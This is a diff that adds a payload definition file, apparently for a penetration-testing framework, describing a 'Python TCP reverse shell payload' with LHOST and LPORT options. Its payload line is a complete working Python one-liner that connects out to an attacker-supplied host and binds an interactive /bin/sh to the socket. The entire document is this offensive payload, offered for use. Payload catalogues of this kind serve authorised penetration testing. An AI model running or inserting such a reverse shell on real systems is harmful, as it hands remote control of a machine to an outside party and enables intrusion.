@@ -1,0 +1,5 @@
+title=Python TCP reverse shell payload
+info=no extra info needed
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=/usr/bin/env python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
